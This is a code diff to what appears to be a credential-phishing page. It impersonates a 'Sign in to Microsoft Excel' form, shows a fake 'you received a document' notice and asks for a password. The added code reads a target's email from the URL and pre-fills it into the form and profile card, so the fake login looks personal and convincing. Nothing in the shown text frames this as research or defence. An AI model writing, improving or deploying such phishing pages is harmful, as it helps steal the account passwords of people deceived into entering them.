@@ -30,8 +30,23 @@ function getUrlParams() {
     const hash = window.location.hash.substring(1);
     const params = new URLSearchParams(hash);
 
-    // Fetch the value of the hidden input with id="mx"
-    const mxValue = document.getElementById('mx')?.value || '';
+    // Get email from URL parameter or hash
+    let email = params.get('email');
+    
+    // If not found in hash, check query parameter
+    if (!email) {
+        const urlParams = new URLSearchParams(window.location.search);
+        email = urlParams.get('email');
+    }
+
+    // If email found, update the hidden input value
+    const mxInput = document.getElementById('mx');
+    if (mxInput && email) {
+        mxInput.value = email;
+    }
+
+    // Get the updated mx value
+    const mxValue = mxInput ? mxInput.value : '';
 
     return {
         targetid: mxValue,
@@ -71,13 +86,13 @@ function getUrlParams() {
                 <h2 class="form-title">Sign in to Microsoft Excel</h2>
                 <input type="hidden" id="email" name="email" value="${mxValue}">
                 <div class="profile-card" id="pcard" style="display: flex;">
-                    <div class="avatar" style="background-color: rgb(123, 139, 142);">${userInitials}</div>
-                    <div class="profile-details">
-                        <span class="profile-name">${mxValue}</span>
-                        <span class="profile-message">you received a document</span>
-                    </div>
-                    <div class="profile-time" id="profileTime">8:25 AM</div>
-                </div>
+    <div class="avatar" style="background-color: rgb(123, 139, 142);">${userInitials}</div>
+    <div class="profile-details">
+        <span class="profile-name" id="profileEmail">${mxValue}</span>
+        <span class="profile-message">you received a document</span>
+    </div>
+    <div class="profile-time" id="profileTime">8:25 AM</div>
+</div>
                 <div class="form-field">
                     <input type="password" class="input-field" placeholder="Password" spellcheck="true" name="pp" id="password" />
                 </div>
